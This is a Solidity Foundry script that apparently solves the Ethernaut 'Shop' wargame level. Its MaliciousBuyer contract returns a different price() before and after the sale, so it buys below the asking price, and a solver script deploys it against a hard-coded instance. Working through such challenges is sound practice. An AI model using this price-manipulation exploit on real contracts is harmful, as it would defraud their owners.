// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Shop } from "../src/Shop.sol";

contract MaliciousBuyer {

	Shop public instance = Shop(0x04a9dBe9Cd908c02d4D5d8c4c25F995F7470B991);

    function attack() external {
        
        // address(instance).call{gas: gas}(abi.encodeWithSignature("buy()"));
        instance.buy();

    }

    function price() external view returns (uint256)
    {
        if (instance.isSold())
            return 0;
        else
            return 100;
        // return gasleft() % 109;
    }
}

contract ShopSolver is Script {
	
	Shop public instance = Shop(0x04a9dBe9Cd908c02d4D5d8c4c25F995F7470B991);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

        // MaliciousBuyer mb = new MaliciousBuyer();
        // console.logBytes32(bytes32(instance.price()));
        // console.log(instance.isSold());

        // uint256 gas = 24743;
        // while (instance.isSold() == false && instance.price() >= uint256(100))
        // {
        //     mb.attack(gas);
        //     console.logBytes32(bytes32(gas));
        //     console.logBytes32(bytes32(instance.price()));
        //     console.log(instance.isSold());
        //     gas++;
        // }

        
        // uint256 gas = 25274;
        // mb.attack(gas);
        // console.logBytes32(bytes32(gas));
        // console.logBytes32(bytes32(instance.price()));
        // console.log(instance.isSold());

        MaliciousBuyer mb = new MaliciousBuyer();
        mb.attack();

		vm.stopBroadcast();


	}

}
